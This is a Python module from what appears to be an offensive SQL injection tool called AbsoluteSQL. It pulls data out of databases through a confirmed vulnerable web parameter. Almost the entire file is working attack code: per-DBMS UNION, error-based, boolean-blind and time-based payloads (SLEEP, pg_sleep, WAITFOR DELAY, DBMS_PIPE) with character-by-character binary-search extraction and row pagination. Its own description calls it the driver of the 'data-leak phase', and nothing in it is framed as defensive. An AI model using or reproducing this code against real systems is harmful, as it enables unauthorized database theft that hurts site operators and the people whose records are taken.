"""
AbsoluteSQL — Injector
Builds and fires extraction payloads using the confirmed injection
technique and DBMS. Drives the actual data-leak phase.
"""

import re
from typing import Optional, List, Dict

from .config import (
    INJ_ERROR, INJ_UNION, INJ_BOOLEAN, INJ_TIME,
    TIME_DELAY, TIME_THRESHOLD, MAX_EXTRACT_LEN, BINARY_SEARCH_CHARS
)
from .payloads import (
    ERROR_EXTRACT_TEMPLATES, BLIND_EXTRACT_TEMPLATES,
    BLIND_LENGTH_TEMPLATES, EXTRACTION_QUERIES, UNION_MARKER
)
from .http_client import HTTPClient
from .scanner import Vulnerability
from .detector import ResponseAnalyzer
from .utils import log, inject_param, clean_extracted


class Injector:
    """
    Executes extraction payloads against a confirmed vulnerable parameter.
    Dispatches to the correct technique based on vuln.inj_type.
    """

    def __init__(
        self,
        client:  HTTPClient,
        vuln:    Vulnerability,
        dbms:    str,
    ) -> None:
        self.client   = client
        self.vuln     = vuln
        self.dbms     = dbms
        self.analyzer = ResponseAnalyzer()
        self._baseline: Optional[str] = self._fetch_baseline()

    # ── Public: run a query and return its output ─────────────────────────────
    def extract(self, query: str) -> Optional[str]:
        """
        Run arbitrary SELECT query through the confirmed injection channel.
        Returns string result or None.
        """
        inj = self.vuln.inj_type

        if inj == INJ_ERROR:
            return self._extract_error(query)
        elif inj == INJ_UNION:
            return self._extract_union(query)
        elif inj == INJ_BOOLEAN:
            return self._extract_boolean(query)
        elif inj == INJ_TIME:
            return self._extract_time(query)
        return None

    def extract_list(self, query: str, limit: int = 50) -> List[str]:
        """
        Run a query that returns multiple rows.
        For union/error: wraps in GROUP_CONCAT or equivalent.
        For blind: extracts one row at a time.
        """
        inj = self.vuln.inj_type

        if inj in (INJ_UNION, INJ_ERROR):
            return self._extract_list_direct(query, limit)
        else:
            return self._extract_list_blind(query, limit)

    # ── Error-Based extraction ────────────────────────────────────────────────
    def _extract_error(self, query: str) -> Optional[str]:
        templates = ERROR_EXTRACT_TEMPLATES.get(self.dbms, ERROR_EXTRACT_TEMPLATES.get("MySQL", []))
        for tmpl in templates:
            payload = tmpl.replace("{query}", query)
            r = self._send(payload)
            if r is None:
                continue

            result = self._parse_error_output(r.text)
            if result:
                log.debug(f"[error-extract] query={query!r} → {result!r}")
                return clean_extracted(result)
        return None

    def _parse_error_output(self, text: str) -> Optional[str]:
        """Extract data from between the ~ markers we inject."""
        m = re.search(r"~([^~]{1,512})~", text)
        if m:
            return m.group(1)

        # MSSQL: "Conversion failed when converting the nvarchar value 'DATA'"
        m = re.search(r"converting.*?'([^']{1,512})'", text, re.IGNORECASE)
        if m:
            return m.group(1)

        # PostgreSQL: invalid input syntax for type integer: "DATA"
        m = re.search(r'invalid input syntax.*?"([^"]{1,512})"', text, re.IGNORECASE)
        if m:
            return m.group(1)

        return None

    # ── Union-Based extraction ────────────────────────────────────────────────
    def _extract_union(self, query: str) -> Optional[str]:
        if self.vuln.union_cols is None or self.vuln.union_idx is None:
            return None

        cols = ["NULL"] * self.vuln.union_cols
        cols[self.vuln.union_idx - 1] = f"({query})"
        col_str = ",".join(cols)

        for tmpl in [
            f"' UNION SELECT {col_str}--",
            f"' UNION ALL SELECT {col_str}--",
            f"-1 UNION SELECT {col_str}--",
            f"-1 UNION ALL SELECT {col_str}--",
        ]:
            r = self._send(tmpl)
            if r is None:
                continue

            # The data appears directly in the page
            result = self._parse_union_output(r.text)
            if result:
                log.debug(f"[union-extract] query={query!r} → {result!r}")
                return clean_extracted(result)
        return None

    def _parse_union_output(self, text: str) -> Optional[str]:
        """
        Look for UNION-injected output in the page.
        We use the UNION_MARKER to find our injection column, then
        grab data from the position where it would appear.
        """
        # Our marker-based approach: wrap data between markers
        m = re.search(rf"{UNION_MARKER}(.*?){UNION_MARKER}", text, re.DOTALL)
        if m:
            return m.group(1).strip()

        # Fallback: look for typical data patterns that aren't markup
        # (e.g. version strings, user@host patterns)
        m = re.search(r"(\d+\.\d+[\.\-\w]*@[\w\.\-]+|\d+\.\d+\.\d+[\-\w]*)", text)
        if m:
            return m.group(1)

        return None

    def _extract_list_direct(self, query: str, limit: int) -> List[str]:
        """
        For error/union techniques: wrap query in GROUP_CONCAT/STRING_AGG
        to pull all rows in one shot.
        """
        agg_queries = {
            "MySQL":                  f"SELECT GROUP_CONCAT(x SEPARATOR '||') FROM ({query} LIMIT {limit}) AS t(x)",
            "MariaDB":                f"SELECT GROUP_CONCAT(x SEPARATOR '||') FROM ({query} LIMIT {limit}) AS t(x)",
            "PostgreSQL":             f"SELECT STRING_AGG(x::text,'||') FROM ({query} LIMIT {limit}) x(x)",
            "Microsoft SQL Server":   f"SELECT STUFF((SELECT '||'+x FROM ({query}) t(x) FOR XML PATH('')),1,2,'')",
            "Oracle":                 f"SELECT LISTAGG(x,'||') WITHIN GROUP (ORDER BY x) FROM ({query}) t(x)",
            "SQLite":                 f"SELECT GROUP_CONCAT(x,'||') FROM ({query}) t(x)",
        }

        # Generic fallback: just run the raw query and split by newlines
        agg_q = agg_queries.get(self.dbms, query)
        raw = self.extract(agg_q)
        if raw:
            return [r.strip() for r in raw.split("||") if r.strip()]

        # Fallback: paginate manually
        return self._extract_list_blind(query, limit)

    def _extract_list_blind(self, query: str, limit: int) -> List[str]:
        """
        For blind techniques: extract one row at a time using LIMIT/OFFSET.
        """
        rows = []
        for offset in range(limit):
            paged_query = self._paginate_query(query, 1, offset)
            val = self.extract(paged_query)
            if val is None or val == "":
                break
            rows.append(val)
        return rows

    def _paginate_query(self, query: str, limit: int, offset: int) -> str:
        """Wrap a query with LIMIT/OFFSET for the right DBMS."""
        d = self.dbms
        if d in ("MySQL", "MariaDB", "PostgreSQL", "SQLite"):
            return f"SELECT x FROM ({query}) t(x) LIMIT {limit} OFFSET {offset}"
        elif d == "Microsoft SQL Server":
            return (
                f"SELECT x FROM ({query}) t(x) "
                f"ORDER BY (SELECT NULL) "
                f"OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY"
            )
        elif d == "Oracle":
            return (
                f"SELECT x FROM (SELECT x, ROWNUM rn FROM ({query}) t(x)) "
                f"WHERE rn>{offset} AND rn<={offset + limit}"
            )
        return query

    # ── Boolean-Based blind extraction ────────────────────────────────────────
    def _extract_boolean(self, query: str) -> Optional[str]:
        """
        Extract string data character by character using binary comparison.
        """
        length = self._blind_length(query)
        if length == 0 or length is None:
            return None

        length = min(length, MAX_EXTRACT_LEN)
        result = []

        for pos in range(1, length + 1):
            ch = self._blind_char_binary(query, pos)
            if ch is None:
                break
            result.append(ch)

        return clean_extracted("".join(result)) if result else None

    def _blind_length(self, query: str) -> Optional[int]:
        """Binary search for the length of a blind-extracted string."""
        tmpl = BLIND_LENGTH_TEMPLATES.get(self.dbms, BLIND_LENGTH_TEMPLATES["generic"])
        lo, hi = 1, MAX_EXTRACT_LEN

        # confirm there IS data
        check = tmpl.replace("{query}", query).replace("{length}", "1")
        r = self._send(check)
        if r is None:
            return None

        # binary search
        while lo < hi:
            mid = (lo + hi + 1) // 2
            payload = tmpl.replace("{query}", query).replace("{length}", str(mid))
            r = self._send(payload)
            if r is None:
                return None
            if self._is_true_response(r.text):
                lo = mid
            else:
                hi = mid - 1

        return lo if lo >= 1 else None

    def _blind_char_binary(self, query: str, pos: int) -> Optional[str]:
        """Binary search character at position pos in query result."""
        charset = BINARY_SEARCH_CHARS
        lo, hi  = 0, len(charset) - 1

        tmpl = BLIND_EXTRACT_TEMPLATES.get(self.dbms, BLIND_EXTRACT_TEMPLATES["generic"])

        while lo <= hi:
            mid  = (lo + hi) // 2
            char = charset[mid]
            payload = (tmpl
                .replace("{query}", query)
                .replace("{pos}", str(pos))
                .replace("{char}", char))
            r = self._send(payload)
            if r is None:
                return None
            if self._is_true_response(r.text):
                return char
            # Compare ordinal value with ASCII test
            ord_tmpl = tmpl.replace("{char}", charset[mid])
            gt_payload = (
                f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{ord(charset[mid])}--"
            )
            r2 = self._send(gt_payload)
            if r2 and self._is_true_response(r2.text):
                lo = mid + 1
            else:
                hi = mid - 1

        return None

    def _is_true_response(self, text: str) -> bool:
        """
        Determine whether a response matches the 'true' condition baseline.
        Compare by length similarity to baseline.
        """
        if self._baseline is None:
            return False
        ratio = len(text) / max(len(self._baseline), 1)
        return 0.90 <= ratio <= 1.10

    # ── Time-Based blind extraction ───────────────────────────────────────────
    def _extract_time(self, query: str) -> Optional[str]:
        """
        Extract string character by character using SLEEP/WAITFOR timing.
        """
        length = self._time_length(query)
        if not length:
            return None

        length = min(length, MAX_EXTRACT_LEN)
        result = []

        for pos in range(1, length + 1):
            ch = self._time_char(query, pos)
            if ch is None:
                break
            result.append(ch)

        return clean_extracted("".join(result)) if result else None

    def _time_length(self, query: str) -> Optional[int]:
        """Find string length via time-based binary search."""
        from .payloads import get_time_payloads
        delay = TIME_DELAY

        for length in range(1, 65):
            cond_tmpl = {
                "MySQL":                f"' AND IF(LENGTH(({query}))={length},SLEEP({delay}),0)--",
                "PostgreSQL":           f"' AND (SELECT CASE WHEN LENGTH(({query}))={length} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
                "Microsoft SQL Server": f"' IF (LEN(({query}))={length}) WAITFOR DELAY '0:0:{delay}'--",
                "Oracle":               f"' AND (SELECT CASE WHEN LENGTH(({query}))={length} THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual)=1--",
                "SQLite":               f"' AND (CASE WHEN LENGTH(({query}))={length} THEN 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000)))) ELSE 0 END)--",
            }
            payload = cond_tmpl.get(self.dbms, cond_tmpl.get("MySQL", ""))
            test_url = inject_param(self.vuln.url, self.vuln.param, self.vuln.payload.split(" ")[0] + payload)
            _, elapsed = self.client.timed_get(test_url, forced_timeout=delay * 3)
            if elapsed >= delay * 0.8:
                return length
        return None

    def _time_char(self, query: str, pos: int) -> Optional[str]:
        """Extract character at position using time-based ASCII bisection."""
        delay   = TIME_DELAY
        charset = BINARY_SEARCH_CHARS
        lo, hi  = 0, len(charset) - 1

        while lo < hi:
            mid = (lo + hi) // 2
            ord_mid = ord(charset[mid])

            cond_tmpl = {
                "MySQL":                f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{ord_mid},SLEEP({delay}),0)--",
                "PostgreSQL":           f"' AND (SELECT CASE WHEN ASCII(SUBSTRING(({query}),{pos},1))>{ord_mid} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
                "Microsoft SQL Server": f"' IF (ASCII(SUBSTRING(({query}),{pos},1))>{ord_mid}) WAITFOR DELAY '0:0:{delay}'--",
                "Oracle":               f"' AND (SELECT CASE WHEN ASCII(SUBSTR(({query}),{pos},1))>{ord_mid} THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual)=1--",
            }
            payload = cond_tmpl.get(self.dbms, cond_tmpl.get("MySQL", ""))
            test_url = inject_param(self.vuln.url, self.vuln.param, self.vuln.payload.split(" ")[0] + payload)
            _, elapsed = self.client.timed_get(test_url, forced_timeout=delay * 3)

            if elapsed >= delay * 0.8:
                lo = mid + 1
            else:
                hi = mid

        if lo < len(charset):
            return charset[lo]
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _send(self, payload: str):
        url, param, method = self.vuln.url, self.vuln.param, self.vuln.method
        full_payload = self.vuln.payload.split(" ")[0] + payload  # prefix with original value
        if method == "GET":
            return self.client.get(inject_param(url, param, full_payload))
        return self.client.post(url, data={param: full_payload})

    def _fetch_baseline(self) -> Optional[str]:
        r = self.client.get(self.vuln.url)
        return r.text if r else None
